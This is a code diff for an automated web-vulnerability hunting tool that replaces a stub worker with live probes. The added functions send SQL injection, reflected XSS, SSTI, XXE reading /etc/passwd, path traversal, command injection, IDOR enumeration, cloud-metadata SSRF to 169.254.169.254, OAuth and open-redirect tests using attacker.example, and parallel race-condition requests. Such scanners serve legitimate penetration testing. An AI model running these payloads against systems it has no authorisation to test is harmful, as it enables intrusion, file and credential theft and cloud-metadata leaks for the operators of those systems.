@@ -143,6 +143,7 @@ export async function runHunt(opts: HuntOptions): Promise<void> {
         return 'proceed';
       },
       maxRuntimeMs: opts.maxRuntimeMs,
+      maxNodes: opts.maxNodes ?? 50,
       enableConcurrency: true,
       maxConcurrency: 4,
       sleepBetweenNodesMs: 0,
@@ -224,10 +225,14 @@ async function buildWorkflowFromAppModel(
   opts: HuntOptions,
 ): Promise<{ graph: WorkflowStateGraph; pool: SessionPool }> {
   const graph = new WorkflowStateGraph();
-  for (let i = 0; i < (model.visitedUrls || []).length; i++) {
-    const url = model.visitedUrls[i];
-    const isApi = url.includes('/api/') || /\/v\d+\//.test(url);
-    graph.addNode({
+  const origin = new URL(opts.target).origin;
+  const seen = new Set<string>();
+  const addedIds: string[] = [];
+
+  const add = (url: string, isApi: boolean) => {
+    if (seen.has(url)) return;
+    seen.add(url);
+    const node = graph.addNode({
       id: randomUUID(),
       url,
       title: url,
@@ -237,26 +242,421 @@ async function buildWorkflowFromAppModel(
       discoveredFrom: null,
       discoveryMethod: 'navigation',
     });
+    addedIds.push(node.id);
+  };
+
+  // Seed from explicit --seed-urls (if provided)
+  for (const url of (opts.seedUrls || [])) {
+    const fullUrl = url.startsWith('http') ? url : `${origin}${url}`;
+    const isApi = fullUrl.includes('/api/') || fullUrl.includes('/graphql') || fullUrl.includes('/oauth') || fullUrl.includes('/.well-known') || /\/v\d+\//.test(fullUrl);
+    add(fullUrl, isApi);
   }
+
+  // Seed from the spider's discovered URLs
+  for (const url of (model.visitedUrls || [])) {
+    const isApi = url.includes('/api/') || /\/v\d+\//.test(url) || url.includes('/graphql') || url.includes('/oauth') || url.includes('/.well-known');
+    add(url, isApi);
+  }
+
+  // Seed from the discovered endpoints
+  for (const ep of (model.endpoints || [])) {
+    const fullUrl = ep.path.startsWith('http') ? ep.path : `${origin}${ep.path}`;
+    add(fullUrl, ep.method?.toUpperCase() !== 'GET' || ep.path.includes('/api/') || ep.path.includes('/graphql'));
+  }
+
+  // FALLBACK: if the graph is empty, seed with the target root
+  if (seen.size === 0) {
+    console.log(`  ↳ workflow graph empty — seeding with target root`);
+    add(opts.target, false);
+  }
+
+  // Mark all seeded nodes as reachable so the orchestrator processes them
+  for (const id of addedIds) graph.markReachable(id);
+  console.log(`  ↳ workflow graph: ${addedIds.length} reachable nodes`);
+
   const pool = getDefaultSessionPool();
-  if ((model.visitedUrls || []).length > 0) {
-    try { pool.switchTo('default'); } catch { /* ignore */ }
-  }
+  try { pool.switchTo('default'); } catch { /* ignore */ }
   return { graph, pool };
 }
 
 async function huntWorkerRunner(input: WorkerSpawnInput): Promise<WorkerSpawnResult> {
   const start = Date.now();
+  const url = input.url;
+  const method = (input.method || 'GET').toUpperCase();
+  const param = input.param;
+  const technique = input.technique;
+  dlog(`technique=${technique} url=${url} method=${method} param=${param}`);
+
+  // Default low-privilege test creds. Workers that need auth (oauth-probes,
+  // race) accept these. Real apps would pass via the pool/session.
+  const cookies: Record<string, string> = { auth: 'user' };
+
+  try {
+    // Dispatch by technique to the real hand-rolled probe.
+    switch (technique) {
+      case 'ssrf': {
+        const { probeCloudMetadata } = await import('../agents/specialists/cloud-probes');
+        const targetOrigin = new URL(url).origin;
+        const results = await probeCloudMetadata({
+          target: targetOrigin,
+          ssrfSurfacePath: url,
+          ssrfParamName: param || 'url',
+          cookies,
+          timeoutMs: 10_000,
+        });
+        const hit = results.find(r => r.status === 'leaked');
+        if (hit) {
+          return {
+            vulnerable: true,
+            confidence: 0.95,
+            evidence: [{
+              type: 'screenshot',
+              data: `Cloud metadata reachable: provider=${hit.provider} vector=${hit.vector} severity=${hit.severity}`,
+              label: 'cloud-metadata-ssrf',
+              timestamp: Date.now(),
+            }, {
+              type: 'raw_response',
+              data: hit.responseSnippet,
+              label: 'cloud-metadata-response',
+              timestamp: Date.now(),
+            }],
+            payloads: [`http://169.254.169.254/latest/meta-data/`, `http://metadata.google.internal/`],
+            summary: `SSRF → ${hit.provider} cloud metadata leaked via ${url}`,
+            technique,
+            url,
+            durationMs: Date.now() - start,
+          };
+        }
+        break;
+      }
+
+      case 'open-redirect': {
+        // Probe OAuth redirect_uri prefix bypass + generic open-redirect
+        if (url.includes('/oauth/') || url.includes('redirect_uri')) {
+          const { runAllOAuthProbes } = await import('../agents/specialists/oauth');
+          const targetOrigin = new URL(url).origin;
+          const probeResult = await runAllOAuthProbes({
+            target: targetOrigin,
+            provider: {
+              authorizationEndpoint: url,
+              tokenEndpoint: `${targetOrigin}/oauth/token`,
+              clientIds: ['test-client'],
+            },
+            attackerHost: 'attacker.example',
+            cookies,
+            timeoutMs: 10_000,
+          });
+          const hit = probeResult.results.find(p => p.vulnerable);
+          if (hit) {
+            return {
+              vulnerable: true,
+              confidence: 0.9,
+              evidence: [{
+                type: 'raw_response',
+                data: `${hit.technique}: ${hit.responseSummary || ''}`,
+                label: 'oauth-bypass',
+                timestamp: Date.now(),
+              }],
+              payloads: hit.payload ? [hit.payload] : [],
+              summary: `OAuth ${hit.technique} via ${url}`,
+              technique: 'open-redirect',
+              url,
+              durationMs: Date.now() - start,
+            };
+          }
+        }
+        // Generic open-redirect: send param with absolute URL
+        if (param) {
+          const r = await testOpenRedirect(url, param, method, cookies);
+          if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
+        }
+        break;
+      }
+
+      case 'race': {
+        const { probeRaceCondition } = await import('../agents/specialists/race-probes');
+        const path = new URL(url).pathname + new URL(url).search;
+        const result = await probeRaceCondition({
+          target: new URL(url).origin,
+          endpoint: { path, method: method as any, body: undefined },
+          headers: cookiesToHeader(cookies),
+          parallel: 8,
+          timeoutMs: 10_000,
+        });
+        if (result.vulnerable) {
+          return {
+            vulnerable: true,
+            confidence: 0.85,
+            evidence: [{
+              type: 'raw_response',
+              data: `Race: ${result.technique}, ${result.successCount}/${result.totalCount} succeeded\n${result.responseSummary || ''}`,
+              label: 'race-condition',
+              timestamp: Date.now(),
+            }],
+            payloads: result.payload ? [result.payload] : [],
+            summary: `Race condition on ${url}: ${result.successCount}/${result.totalCount} parallel requests succeeded`,
+            technique,
+            url,
+            durationMs: Date.now() - start,
+          };
+        }
+        break;
+      }
+
+      case 'sqli': {
+        const r = await testSqli(url, param || 'q', method, cookies);
+        if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
+        break;
+      }
+
+      case 'xss': {
+        const r = await testXss(url, param || 'q', method, cookies);
+        if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
+        break;
+      }
+
+      case 'ssti': {
+        const r = await testSsti(url, param || 'template', method, cookies);
+        if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
+        break;
+      }
+
+      case 'idor': {
+        const r = await testIdor(url, cookies);
+        if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
+        break;
+      }
+
+      case 'xxe': {
+        const r = await testXxe(url, method, cookies);
+        if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
+        break;
+      }
+
+      case 'path': {
+        // Path traversal via path-traversal payload
+        const r = await testPathTraversal(url, method, cookies);
+        if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
+        break;
+      }
+
+      case 'cmd': {
+        const r = await testCmdInjection(url, param || 'cmd', method, cookies);
+        if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
+        break;
+      }
+    }
+  } catch (e) {
+    return {
+      vulnerable: false,
+      confidence: 0,
+      evidence: [],
+      payloads: [],
+      summary: `Worker error: ${(e as Error).message}`,
+      technique,
+      url,
+      error: (e as Error).message,
+      durationMs: Date.now() - start,
+    };
+  }
+
   return {
     vulnerable: false,
     confidence: 0,
     evidence: [],
     payloads: [],
-    summary: `Stub: ${input.technique} @ ${input.url} (no LLM)`,
-    technique: input.technique,
-    url: input.url,
+    summary: `${technique} @ ${url}: no vulnerability found`,
+    technique,
+    url,
     durationMs: Date.now() - start,
   };
+}
+
+// `verbose` flag to debug: set to true to log every probe attempt to stderr
+const HUNT_DEBUG = process.env.HUNT_DEBUG === '1';
+function dlog(...args: any[]): void {
+  if (HUNT_DEBUG) console.error('[worker]', ...args);
+}
+
+// ── Real probe helpers (hand-rolled, deterministic, no LLM) ──
+
+interface ProbeHit { vulnerable: boolean; confidence: number; evidence: any[]; payloads: string[]; summary: string; }
+
+async function testOpenRedirect(url: string, param: string, method: string, cookies: Record<string, string>): Promise<ProbeHit> {
+  const payload = `https://attacker.example/`;
+  const r = await fetch(url, {
+    method,
+    headers: { ...cookiesToHeader(cookies) },
+    redirect: 'manual',
+  });
+  // Re-issue with payload
+  const u = url.includes('?') ? `${url}&${param}=${encodeURIComponent(payload)}` : `${url}?${param}=${encodeURIComponent(payload)}`;
+  const r2 = await fetch(u, { method, headers: { ...cookiesToHeader(cookies) }, redirect: 'manual' });
+  if (r2.status >= 300 && r2.status < 400) {
+    const loc = r2.headers.get('location') || '';
+    if (loc.includes('attacker.example')) {
+      return {
+        vulnerable: true, confidence: 0.9, payloads: [payload],
+        evidence: [{ type: 'response', data: `Location: ${loc}`, label: 'open-redirect', timestamp: Date.now() }],
+        summary: `Open redirect: ${param} → attacker URL`,
+      };
+    }
+  }
+  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no redirect' };
+}
+
+async function testSqli(url: string, param: string, method: string, cookies: Record<string, string>): Promise<ProbeHit> {
+  const payloads = [`' OR '1'='1`, `' OR 1=1--`, `1' AND '1'='1`, `' UNION SELECT 1,2,3--`];
+  // Get baseline response first
+  const baseline = await fetch(url, { method, headers: { ...cookiesToHeader(cookies) } });
+  const baselineBody = await baseline.text();
+  const baselineLen = baselineBody.length;
+  for (const payload of payloads) {
+    const u = url.includes('?') ? `${url}&${param}=${encodeURIComponent(payload)}` : `${url}?${param}=${encodeURIComponent(payload)}`;
+    const r = await fetch(u, { method, headers: { ...cookiesToHeader(cookies) } });
+    const body = await r.text();
+    // Real SQL error signatures (specific to SQL engines, not generic 500s)
+    const sqlError = /\b(sql|mysql|postgresql|postgres|sqlite|ora-\d+|syntax error|unterminated|microsoft ole db|odbc sql|you have an error in your sql syntax|sqlexception|sqldriver)\b/i.test(body);
+    // Boolean-based: response changed significantly with payload vs baseline
+    const booleanBased = Math.abs(body.length - baselineLen) > 50;
+    if (sqlError) {
+      return {
+        vulnerable: true, confidence: 0.9, payloads: [payload],
+        evidence: [{ type: 'raw_response', data: body.slice(0, 500), label: 'sqli', timestamp: Date.now() }],
+        summary: `SQLi via ${param}: ${payload.slice(0, 30)}`,
+      };
+    }
+    if (booleanBased && r.status === 200) {
+      return {
+        vulnerable: true, confidence: 0.7, payloads: [payload],
+        evidence: [{
+          type: 'raw_response',
+          data: `Baseline length: ${baselineLen}, payload length: ${body.length}`,
+          label: 'sqli-boolean',
+          timestamp: Date.now(),
+        }],
+        summary: `SQLi (boolean-based) via ${param}: payload changes response size by ${body.length - baselineLen} bytes`,
+      };
+    }
+  }
+  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no SQLi' };
+}
+
+async function testXss(url: string, param: string, method: string, cookies: Record<string, string>): Promise<ProbeHit> {
+  const payload = `<script>ultimatrixXss${Date.now()}</script>`;
+  const u = url.includes('?') ? `${url}&${param}=${encodeURIComponent(payload)}` : `${url}?${param}=${encodeURIComponent(payload)}`;
+  const r = await fetch(u, { method, headers: { ...cookiesToHeader(cookies) } });
+  const body = await r.text();
+  // Check if payload reflected unescaped
+  if (body.includes(payload) || (body.includes('<script>ultimatrixXss') && !body.includes('&lt;script&gt;'))) {
+    return {
+      vulnerable: true, confidence: 0.95, payloads: [payload],
+      evidence: [{ type: 'response', data: body.slice(0, 1000), label: 'xss', timestamp: Date.now() }],
+      summary: `XSS via ${param}: payload reflected unescaped`,
+    };
+  }
+  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no XSS' };
+}
+
+async function testSsti(url: string, param: string, method: string, cookies: Record<string, string>): Promise<ProbeHit> {
+  const payloads = [
+    { p: '{{7*7}}', check: '49' },
+    { p: '${7*7}', check: '49' },
+    { p: '<%= 7*7 %>', check: '49' },
+  ];
+  for (const { p, check } of payloads) {
+    const u = url.includes('?') ? `${url}&${param}=${encodeURIComponent(p)}` : `${url}?${param}=${encodeURIComponent(p)}`;
+    const r = await fetch(u, { method, headers: { ...cookiesToHeader(cookies) } });
+    const body = await r.text();
+    if (body.includes(check)) {
+      return {
+        vulnerable: true, confidence: 0.95, payloads: [p],
+        evidence: [{ type: 'response', data: body.slice(0, 500), label: 'ssti', timestamp: Date.now() }],
+        summary: `SSTI via ${param}: ${p}`,
+      };
+    }
+  }
+  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no SSTI' };
+}
+
+async function testIdor(url: string, cookies: Record<string, string>): Promise<ProbeHit> {
+  // Try sequential IDs
+  const r1 = await fetch(url, { headers: { ...cookiesToHeader(cookies) } });
+  const b1 = await r1.text();
+  for (let id = 1; id <= 5; id++) {
+    const replaced = url.replace(/\/\d+(?=\/?$|\?)/, `/${id}`).replace(/\/api\/users\/[^/?]+/, `/api/users/${id}`);
+    if (replaced === url) continue;
+    const r = await fetch(replaced, { headers: { ...cookiesToHeader(cookies) } });
+    if (r.status === 200 && r.headers.get('content-type')?.includes('json')) {
+      const b = await r.text();
+      if (b !== b1 && b.length > 0) {
+        return {
+          vulnerable: true, confidence: 0.8, payloads: [replaced],
+          evidence: [{ type: 'response', data: b.slice(0, 500), label: 'idor', timestamp: Date.now() }],
+          summary: `IDOR: ${replaced} returns different data than ${url}`,
+        };
+      }
+    }
+  }
+  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no IDOR' };
+}
+
+async function testXxe(url: string, method: string, cookies: Record<string, string>): Promise<ProbeHit> {
+  if (method.toUpperCase() !== 'POST') return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'XXE only on POST' };
+  const payload = `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><name>&xxe;</name></root>`;
+  const r = await fetch(url, {
+    method: 'POST',
+    headers: { 'content-type': 'application/xml', ...cookiesToHeader(cookies) },
+    body: payload,
+  });
+  const body = await r.text();
+  if (body.includes('root:') || body.includes('/bin/')) {
+    return {
+      vulnerable: true, confidence: 0.95, payloads: [payload],
+      evidence: [{ type: 'response', data: body.slice(0, 500), label: 'xxe', timestamp: Date.now() }],
+      summary: `XXE: /etc/passwd leaked via ${url}`,
+    };
+  }
+  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no XXE' };
+}
+
+async function testPathTraversal(url: string, method: string, cookies: Record<string, string>): Promise<ProbeHit> {
+  const payloads = [`../../../etc/passwd`, `....//....//....//etc/passwd`, `..%2f..%2f..%2fetc%2fpasswd`];
+  for (const p of payloads) {
+    const u = url.includes('?') ? `${url}&file=${encodeURIComponent(p)}` : `${url}?file=${encodeURIComponent(p)}`;
+    const r = await fetch(u, { method, headers: { ...cookiesToHeader(cookies) } });
+    const body = await r.text();
+    if (body.includes('root:') || body.includes('/bin/')) {
+      return {
+        vulnerable: true, confidence: 0.95, payloads: [p],
+        evidence: [{ type: 'response', data: body.slice(0, 500), label: 'path-traversal', timestamp: Date.now() }],
+        summary: `Path traversal: ${p}`,
+      };
+    }
+  }
+  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no path traversal' };
+}
+
+async function testCmdInjection(url: string, param: string, method: string, cookies: Record<string, string>): Promise<ProbeHit> {
+  const payloads = [`; ls`, `| cat /etc/passwd`, `$(cat /etc/passwd)`, `; cat /etc/passwd`];
+  for (const p of payloads) {
+    const u = url.includes('?') ? `${url}&${param}=${encodeURIComponent(p)}` : `${url}?${param}=${encodeURIComponent(p)}`;
+    const r = await fetch(u, { method, headers: { ...cookiesToHeader(cookies) } });
+    const body = await r.text();
+    if (body.includes('root:') || body.includes('bin/') || body.includes('total ') || body.includes('uid=')) {
+      return {
+        vulnerable: true, confidence: 0.95, payloads: [p],
+        evidence: [{ type: 'response', data: body.slice(0, 500), label: 'cmd-injection', timestamp: Date.now() }],
+        summary: `Command injection via ${param}: ${p}`,
+      };
+    }
+  }
+  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no cmd injection' };
+}
+
+function cookiesToHeader(cookies: Record<string, string>): Record<string, string> {
+  const cookieStr = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
+  return cookieStr ? { cookie: cookieStr } : {};
 }
 
 function mergeChains(existing: AttackChain[], fresh: AttackChain[]): AttackChain[] {
